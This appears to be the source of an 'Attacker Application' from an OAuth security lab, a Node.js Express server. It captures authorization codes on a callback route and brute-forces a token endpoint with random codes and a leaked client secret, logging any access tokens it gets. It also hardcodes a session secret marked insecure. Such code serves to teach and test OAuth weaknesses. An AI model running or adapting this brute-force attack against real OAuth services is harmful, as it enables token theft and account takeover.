/*jshint esversion: 6 */
var express = require('express');
var expressSession = require('express-session');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');
var path = require('path');
var request = require('request');

var app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: false}));
app.use(cookieParser());
app.use(expressSession({
  secret: 'changethistoconfigfile', //insecure
  resave: false,
  saveUninitialized: false
}));

//view engine
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

//serve content from public directory
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', function(req, res){
  res.render('index', {});
});

app.get('/callback', function(req, res){
  var code = req.query.code;
  res.render('authcode', {code: code});
});

function makeRequest(options) {
  return new Promise(function(resolve, reject){
    //using a leaked secret
    request(options, function(err, response, body){
      if(err) reject(err);
      if (response.statusCode != 200) {
        reject('Invalid status code <' + response.statusCode + '>');
      }
      resolve(body);
    });
  });
}


app.get('/guessauthzcode', async function(req, res){
  searchSpace = 10000;
  maxGuesses = 100;
  codes = [];
  for(i = 0; i < maxGuesses; i++) {
    randomguess = Math.floor(Math.random()*Math.floor(searchSpace));
    options = {
      'method':'post',
      'headers':{
        'content-type': 'application/x-www-form-urlencoded'
      },
      'url':'http://gallery:3005/oauth/token', 
      'body':'code='+randomguess+'&redirect_uri=http%3A%2F%2Fphotoprint%3A3000%2Fcallback&grant_type=authorization_code&client_id=photoprint&client_secret=secret'
    };
    try {
      response = await makeRequest(options);
      var obj = JSON.parse(response);
      if(obj.access_token != undefined){
        console.log(obj.access_token);
        codes.push({'code':randomguess,'token':obj.access_token});
      }

    }catch (error) {
      console.error(error);
    }
  }
  res.render('authcodeguess', {codes: codes});
});

app.listen(1337, function () {
  console.log('Attacker Application listening on http://localhost:1337');
});
